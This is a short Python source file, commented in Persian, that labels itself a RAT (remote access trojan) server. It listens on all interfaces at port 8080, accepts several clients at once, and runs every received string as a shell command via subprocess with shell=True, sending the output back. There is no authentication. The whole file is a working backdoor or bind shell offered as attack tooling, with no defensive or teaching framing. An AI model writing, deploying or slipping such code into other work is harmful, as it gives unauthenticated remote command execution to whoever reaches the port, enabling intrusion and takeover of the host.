import socket
import threading
import subprocess
import os

# تنظیمات سرور RAT
SERVER_IP = '0.0.0.0'  # سرور باید روی همه آدرس‌های IP سیستم گوش کند
SERVER_PORT = 8080  # پورت برای ارتباط با سرور

# مدیریت هر کلاینت به صورت همزمان
def handle_client(client_socket):
    try:
        print("Client connected.")
        
        while True:
            # دریافت دستور از کلاینت
            command = client_socket.recv(1024).decode('utf-8')
            if not command:
                break

            # دستور 'exit' برای بستن ارتباط
            if command.lower() == 'exit':
                print("Client disconnected.")
                break

            # اجرای دستورات shell به طور مستقیم
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                client_socket.send(output)
            except subprocess.CalledProcessError as e:
                error_message = f"Error executing command: {e.output.decode('utf-8')}"
                client_socket.send(error_message.encode())
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client_socket.close()

# راه‌اندازی سرور
def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((SERVER_IP, SERVER_PORT))
    server_socket.listen(5)  # حداکثر 5 کلاینت به طور همزمان
    print(f"Server started on {SERVER_IP}:{SERVER_PORT}")

    while True:
        client_socket, addr = server_socket.accept()
        print(f"Connection established with {addr}")
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()

if __name__ == "__main__":
    start_server()
